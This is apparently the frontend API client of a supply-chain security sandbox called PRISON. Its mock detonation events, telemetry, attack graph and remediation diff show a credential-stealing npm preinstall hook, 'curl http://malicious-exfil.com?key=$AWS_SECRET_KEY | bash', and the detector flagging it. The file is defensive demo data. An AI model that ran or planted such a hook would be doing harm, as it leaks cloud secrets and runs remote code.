/**
 * PRISON API Client — wraps all backend calls to orchestrator (8000) and telemetry (8001)
 */

const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'https://prison-jmno.onrender.com';
const ORCH = BACKEND_URL;
const TELE = BACKEND_URL;

// ── Helpers ────────────────────────────────────────────────
async function request(url, opts = {}) {
  try {
    const res = await fetch(url, {
      headers: { 'Content-Type': 'application/json', ...opts.headers },
      ...opts,
    });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.detail || `HTTP ${res.status}`);
    return data;
  } catch (error) {
    console.error('[API Fetch Error]:', error);
    return {}; // Empty fallback data to prevent SSR 500 crashes
  }
}

// ── Orchestrator (port 8000) ───────────────────────────────
export const api = {
  /** Health check for orchestrator */
  orchestratorHealth: () => request(`${ORCH}/`),

  /** Fire a simulated GitHub PR webhook */
  fireWebhook: (body) =>
    request(`${ORCH}/api/v1/webhook/github`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Hub-Signature-256': body._sig || '',
      },
      body: JSON.stringify(body),
    }),

  /** Synchronous Detonation endpoint */
  detonateSync: (url) =>
    request(`${ORCH}/api/v1/detonate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url }),
    }),

  // ── Telemetry (port 8001) ──────────────────────────────
  /** Health check for telemetry service */
  telemetryHealth: () => request(`${TELE}/`),

  /** Get all telemetry events stored in memory */
  getTelemetryEvents: () => request(`${TELE}/api/v1/telemetry/events`),

  /** Post a telemetry payload manually */
  postTelemetry: (payload) =>
    request(`${TELE}/api/v1/telemetry/events`, {
      method: 'POST',
      body: JSON.stringify(payload),
    }),
};

// ── HMAC Signature helper (client-side demo, real secret from env) ────
export async function signPayload(secret, body) {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw',
    enc.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(body));
  const hex = Array.from(new Uint8Array(sig))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
  return `sha256=${hex}`;
}

// ── Mock sandbox detonation lifecycle (when backend is offline) ─────
export function mockDetonation(sandboxId, onEvent) {
  const events = [
    { delay: 300,  type: 'SYSTEM', msg: `[MANTITUP] Provisioning Firecracker microVM...` },
    { delay: 700,  type: 'PASS',   msg: `[MANTITUP] MicroVM booted in 112ms — Honeypot keys injected.` },
    { delay: 1100, type: 'RUNNING',msg: `[OSEN eBPF] Probes attached: sys_enter_execve, sys_enter_connect, sys_enter_openat` },
    { delay: 1600, type: 'SYSTEM', msg: `[OSEN eBPF] PID 2041 executed: npm install -> /usr/bin/npm` },
    { delay: 2100, type: 'BREACH', msg: `[OSEN eBPF] PID 4102 spawned process: /bin/bash -c "curl http://malicious-exfil.com?key=$AWS_SECRET_KEY"` },
    { delay: 2500, type: 'SYSTEM', msg: `[OSEN eBPF] PID 2042 executed: node -> .env.honeypot (O_RDONLY)` },
    { delay: 2900, type: 'BREACH', msg: `[OSEN eBPF] PID 4103 spawned connection: curl -> 104.21.44.11:80 [UNAUTHORIZED]` },
    { delay: 3400, type: 'BREACH', msg: `[HONEYPOT] PID 2042 triggered decoy key 'AWS_ACCESS_KEY_ID=AKIA_HONEYPOT_PRISON_DEMO' — HALTING EXECUTION` },
    { delay: 3900, type: 'PASS',   msg: `[TRACECOMMON] Captured 5 syscall events. Building execution DAG...` },
    { delay: 4300, type: 'AGENT',  msg: `[ANAKIN] Evaluating DAG — Threat Detected: TRUE (Confidence: 98%)` },
    { delay: 4700, type: 'AGENT',  msg: `[ANAKIN] Severity: 95/100 | Gating Action: BLOCK_PR` },
    { delay: 5100, type: 'AGENT',  msg: `[ANAKIN] Generating remediation patch for package.json...` },
    { delay: 5500, type: 'PASS',   msg: `[ANAKIN] Unified diff patch generated. Branch: prison/fix-security-${sandboxId?.slice(4,12) || 'demo1234'}` },
    { delay: 5900, type: 'SYSTEM', msg: `[MANTITUP] Ephemeral sandbox teardown complete. Resources released.` },
  ];

  events.forEach(({ delay, type, msg }) => {
    setTimeout(() => onEvent({ type, msg, ts: new Date().toISOString() }), delay);
  });

  return events[events.length - 1].delay + 200;
}

// ── Mock telemetry events ─────────────────────────────────
export const MOCK_EVENTS = [
  { pid: 2041, ppid: 1000, comm: 'npm',  event_type: 'EXECVE',  details: { filename: '/usr/bin/npm', argv: ['install'] },                   is_anomaly: false },
  { pid: 4102, ppid: 2041, comm: 'bash', event_type: 'EXECVE',  details: { filename: '/bin/bash', argv: ['-c', 'curl http://malicious-exfil.com?key=$AWS_SECRET_KEY'] }, is_anomaly: true },
  { pid: 2042, ppid: 2041, comm: 'node', event_type: 'OPENAT',  details: { filename: '.env.honeypot', flags: 'O_RDONLY' },                  is_anomaly: true },
  { pid: 4103, ppid: 4102, comm: 'curl', event_type: 'CONNECT', details: { ip: '104.21.44.11', port: 80, proto: 'TCP' },                    is_anomaly: true },
  { pid: 2042, ppid: 2041, comm: 'node', event_type: 'HONEYPOT_TRIGGER', details: { honeypot_key: 'AWS_ACCESS_KEY_ID', action: 'HALTED' },   is_anomaly: true },
];

// ── Mock attack graph nodes/edges ─────────────────────────
export function buildMockDAG(sandboxId) {
  return {
    execution_id: sandboxId || 'demo-sbx-001',
    has_honeypot_hit: true,
    has_malicious_node: true,
    nodes: [
      { id: 'n1', label: 'npm install', pid: 2041, ppid: 1000, comm: 'npm',  node_type: 'BLUE_STANDARD',   syscall: 'sys_enter_execve', details: { risk_level: 'CLEAN' } },
      { id: 'n2', label: '/bin/bash -c curl...', pid: 4102, ppid: 2041, comm: 'bash', node_type: 'RED_MALICIOUS',   syscall: 'sys_enter_execve', details: { risk_level: 'SUSPICIOUS_EXEC', resolved_path: '/bin/bash' } },
      { id: 'n3', label: 'node (openat .env.honeypot)', pid: 2042, ppid: 2041, comm: 'node', node_type: 'AMBER_HONEYPOT', syscall: 'sys_enter_openat',  details: { risk_level: 'HONEYPOT_HIT', resolved_path: '.env.honeypot' } },
      { id: 'n4', label: 'curl -> 104.21.44.11:80', pid: 4103, ppid: 4102, comm: 'curl', node_type: 'RED_MALICIOUS',   syscall: 'sys_enter_connect', details: { risk_level: 'UNAUTHORIZED_SOCKET', destination_ip: '104.21.44.11', destination_port: 80 } },
    ],
    edges: [
      { source: 'n1', target: 'n2', relationship: 'spawned' },
      { source: 'n1', target: 'n3', relationship: 'spawned' },
      { source: 'n2', target: 'n4', relationship: 'spawned' },
    ],
  };
}

// ── Mock patch diff ────────────────────────────────────────
export const MOCK_PATCH = {
  target_file: 'package.json',
  branch_name: 'prison/fix-security-demo1234',
  summary: 'Neutralized malicious preinstall script exfiltrating $AWS_SECRET_KEY via curl',
  unified_diff: `--- a/package.json
+++ b/package.json
@@ -1,8 +1,8 @@
 {
   "name": "compromised-package",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "curl http://malicious-exfil.com?key=$AWS_SECRET_KEY | bash",
+    "preinstall": "echo 'PRISON: Malicious script entry [preinstall] disabled'",
     "test": "jest"
   }
 }`,
};

// ── Mock threat registry ───────────────────────────────────
export const MOCK_REGISTRY = [
  { id: 'sbx_a1b2c3', repo: 'acme-corp/frontend', pr: 42, status: 'HONEYPOT_HALTED', severity: 95, threat: 'Credential Exfiltration',      ts: '2026-10-02T14:31:00Z', gating: 'BLOCK_PR' },
  { id: 'sbx_d4e5f6', repo: 'acme-corp/api',      pr: 87, status: 'COMPLETED',        severity: 0,  threat: 'Clean',                        ts: '2026-10-02T13:10:00Z', gating: 'ALLOW_MERGE' },
  { id: 'sbx_g7h8i9', repo: 'oss/lib',            pr: 12, status: 'HONEYPOT_HALTED', severity: 80, threat: 'Unauthorized Socket Connection', ts: '2026-10-02T11:45:00Z', gating: 'BLOCK_PR' },
  { id: 'sbx_j0k1l2', repo: 'internal/backend',  pr: 55, status: 'COMPLETED',        severity: 0,  threat: 'Clean',                        ts: '2026-10-01T22:00:00Z', gating: 'ALLOW_MERGE' },
  { id: 'sbx_m3n4o5', repo: 'acme-corp/mobile',  pr: 33, status: 'TIMEOUT',          severity: 40, threat: 'Suspicious Exec (Review)',      ts: '2026-10-01T18:20:00Z', gating: 'FLAG_MANUAL_REVIEW' },
];
